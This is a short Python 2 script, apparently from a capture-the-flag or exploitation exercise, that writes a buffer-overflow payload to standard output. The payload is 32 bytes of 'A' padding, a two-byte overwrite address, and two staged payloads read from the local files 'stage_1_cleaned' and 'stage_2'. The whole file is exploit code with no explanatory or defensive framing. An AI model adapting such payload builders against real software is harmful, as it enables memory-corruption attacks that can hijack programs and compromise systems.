#!/usr/bin/python2

import sys

fh = open('stage_1_cleaned', 'rb')
stage_1 = fh.read()
fh.close()

fh = open('stage_2', 'rb')
stage_2 = fh.read()
fh.close()

TARGET_ADDRESS = "\x01\xce"

sys.stdout.write('A' * 32 + TARGET_ADDRESS + '\n')
sys.stdout.write(stage_1 + '\n')
sys.stdout.write(stage_2 + '\x99')
